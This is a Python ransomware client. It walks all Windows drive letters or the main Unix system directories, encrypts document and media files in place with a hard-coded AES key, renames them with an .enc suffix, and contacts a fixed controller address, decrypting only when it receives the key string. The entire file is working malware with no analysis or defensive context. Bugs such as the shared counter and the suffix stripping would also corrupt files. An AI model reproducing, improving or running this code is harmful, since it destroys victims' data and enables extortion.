import os
import socket
import time
from concurrent.futures import ThreadPoolExecutor
from Cryptodome.Util import Counter
from Cryptodome.Cipher import AES

class FileEncryptor:
    def __init__(self, key=None):
        default_key = "aaaaaaaa".ljust(16, '*').encode()
        self.key = key or default_key
        self.counter = Counter.new(128)

    def encrypt_file(self, file_name, block_size=16):
        cipher = AES.new(self.key, AES.MODE_CTR, counter=self.counter)
        
        if os.path.exists(file_name):
            with open(file_name, "r+b") as f:
                while (chunk := f.read(block_size)):
                    f.seek(-len(chunk), 1)
                    f.write(cipher.encrypt(chunk))
            os.rename(file_name, file_name + ".enc")

    def decrypt_file(self, file_name, block_size=16):
        cipher = AES.new(self.key, AES.MODE_CTR, counter=self.counter)
        
        if os.path.exists(file_name):
            with open(file_name, "r+b") as f:
                while (chunk := f.read(block_size)):
                    f.seek(-len(chunk), 1)
                    f.write(cipher.decrypt(chunk))
            os.rename(file_name, file_name.rstrip(".enc"))

    def list_files(self, directory, extensions):
        found_files = []
        for dirpath, _, files in os.walk(directory):
            for file_name in files:
                if any(file_name.endswith(ext) for ext in extensions):
                    found_files.append(os.path.join(dirpath, file_name))
        return found_files

class ClientHandler:
    def __init__(self, ip="192.168.1.7", port=2000):
        self.ip = ip
        self.port = port
        self.encryptor = FileEncryptor()

    def encrypt_files_in_parallel(self, files):
        with ThreadPoolExecutor() as executor:
            executor.map(self.encryptor.encrypt_file, files)

    def decrypt_files_in_parallel(self, files):
        with ThreadPoolExecutor() as executor:
            executor.map(self.encryptor.decrypt_file, files)

    def listen_for_commands(self, directory):
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((self.ip, self.port))
                    self.encrypt_and_send(s, directory)

            except socket.error:
                time.sleep(5)

    def encrypt_and_send(self, socket_connection, directory):
        files = self.encryptor.list_files(directory, ["txt", "doc", "mp3", "xlsx"])
        self.encrypt_files_in_parallel(files)

        while True:
            try:
                command = socket_connection.recv(2048).decode("ascii")
                if "aaaaaaaa" in command:
                    enc_files = self.encryptor.list_files(directory, ["enc"])
                    self.decrypt_files_in_parallel(enc_files)
                    break 

            except socket.error:
                break 

def main():
    directory = []

    if os.name == 'nt':
        partitions = [f"{chr(drive)}:\\" for drive in range(65, 91) if os.path.exists(f"{chr(drive)}:\\")]
        directory.extend(partitions)
    else:
        directory.extend(["/home", "/usr", "/sbin", "/bin"])

    client_handler = ClientHandler()
    for dir_path in directory:
        client_handler.listen_for_commands(dir_path)

if __name__ == "__main__":
    main()
